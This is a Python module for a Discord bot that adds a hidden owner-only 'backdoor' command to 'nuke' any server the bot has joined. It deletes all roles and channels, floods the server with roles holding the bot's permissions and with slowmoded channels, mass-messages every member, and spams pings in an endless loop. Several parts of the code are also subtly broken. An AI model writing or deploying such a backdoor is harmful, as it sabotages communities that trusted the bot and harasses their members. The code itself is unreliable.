"""Destroys a Discord Server"""

import os

import discord

import chattrigger


class BackdoorGuildNuke(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):
        # It's not a backdoor if everyone has access to it!
        if not message.author.id == int(os.environ.get("OWNER_ID")):
            return

        await message.channel.send('''```
8888888b.   .d8888b.  888     888  .d8888b.  
888  "Y88b d88P  Y88b 888     888 d88P  Y88b 
888    888 Y88b.      888     888      .d88P 
888    888  "Y888b.   Y88b   d88P     8888"  
888    888     "Y88b.  Y88b d88P       "Y8b. 
888    888       "888   Y88o88P   888    888 
888  .d88P Y88b  d88P    Y888P    Y88b  d88P 
8888888P"   "Y8888P"      Y8P      "Y8888P"  - 😎
```''')

        async def confirmation() -> bool:
            confirmation_response_message = await client.wait_for(
                "message",
                check=lambda x: x.author.id == message.author.id
            )

            if confirmation_response_message.content == "Yes":
                return True
            else:
                return False

        async def get_target_guild() -> (discord.Guild, None):
            await message.channel.send("Input the target guild id.")
            target_guild_response_message = await client.wait_for(
                "message",
                check=lambda x: x.author.id == message.author.id
            )
            try:
                target_guild_id = int(target_guild_response_message.content)
            except ValueError:
                await message.channel.send("Invalid guild id")
                return await get_target_guild()

            target_guild_ = client.get_guild(target_guild_id)
            if target_guild_ is None:
                await message.channel.send("Couldn't find guild!")
                return await get_target_guild()

            try:
                await message.channel.send(
                    f"Are you sure you want to nuke {str(target_guild_)} by {str(target_guild_.owner)}?\n"
                    f"Respond with 'Yes' (Case Sensitive) to continue.")
            except AttributeError:
                await message.channel.send(
                    f"Are you sure you want to nuke {str(target_guild_)} by Unknown Owner?\n"
                    f"Respond with 'Yes' (Case Sensitive) to continue.")

            if await confirmation():
                return target_guild_
            else:
                return None

        target_guild = await get_target_guild()
        # get_target_guild returns None when an exit condition is reached
        if target_guild is None:
            await message.channel.send("Aborting!")
            return

        target_guild: discord.Guild

        await message.channel.send(
            "You don't actually have to ping everyone! You can substitute @ everyone with /everyone\n"
            "Note: reason is the reason that shows up in the audit log")

        needed_values = [
            "role_name", "role_reason", "role_colour_hex"
            "text_channel_name", "text_channel_topic", "text_channel_reason",
            "dm_channel_message", "ping_flood_message"
        ]

        aliases = {
            "/everyone": "@everyone"
        }

        values = dict()
        # Fill up values
        for i in needed_values:
            message.channel.send(f"Input {i}")
            values[i] = (await client.wait_for(
                "message", check=lambda x: x.author.id == message.author.id
            )).content

        # Replace aliases
        for k_i, v_i in values:
            v_i: str
            new_value = v_i
            for k_ii, v_ii in aliases:
                new_value = new_value.replace(k_ii, v_ii)
            values[k_i] = new_value

        # Final Confirmation

        pretty_printed_values = ", ".join(f"{k}: {v}" for k, v in values.values())

        await message.channel.send(f"Are you sure you want to continue with this information?\n"
                                   f"{pretty_printed_values}")

        if await confirmation():
            await message.channel.send("☢️")
        else:
            await message.channel.send("Aborting!")
            return

        async def role_nuke():
            await message.channel.send("Starting Role Nuke")
            async for i in target_guild.roles:
                await i.delete(reason=values["role_reason"])

            await message.channel.send("Starting Role Flood")
            colour = discord.Colour(values["role_colour_hex"])
            permissions = target_guild.me.guild_permissions
            while True:
                try:
                    await target_guild.create_role(
                        name=values["role_name"],
                        reason=values["role_reason"],
                        colour=colour,
                        permissions=permissions,
                        hoist=True,
                        mentionable=True
                    )
                except discord.HTTPException:
                    await message.channel.send(f"Reached Role Limit!")
                    break

            await message.channel.send("Done Role Nuke")

            # await message.channel.send("Starting Role Scramble")
            #

        async def channel_nuke():
            await message.channel.send("Starting Channel Nuke")
            async for i in target_guild.channels:
                await i.delete(reason=values["text_channel_reason"])

            await message.channel.send(f"Starting Channel Flood")
            while True:
                try:
                    await target_guild.create_text_channel(
                        values["text_channel_name"],
                        topic=values["text_channel_topic"],
                        reason=values["text_channel_reason"],
                        position=0,
                        slowmode_delay=21600
                    )
                except discord.HTTPException:
                    await message.channel.send(f"Reached Channel Limit!")
                    break

            await message.channel.send("Starting DM Flood")
            maximum_dm_count = len(target_guild.members)
            sent_dm_count = 0
            for i in target_guild.members:
                i: discord.Member
                try:
                    await i.send(values["dm_channel_message"])
                except (discord.HTTPException, discord.Forbidden):
                    pass
                else:
                    sent_dm_count += 1

            await message.channel.send(f"Sent {sent_dm_count}/{maximum_dm_count} direct messages.\n"
                                       f"Starting Ping Flood")

            while True:
                for i in target_guild.text_channels:
                    i: discord.TextChannel
                    try:
                        await i.send(values["ping_flood_message"])
                    except (discord.HTTPException, discord.Forbidden):
                        pass

        tasks = role_nuke(), channel_nuke()

        for i in tasks:
            client.loop.create_task(i)
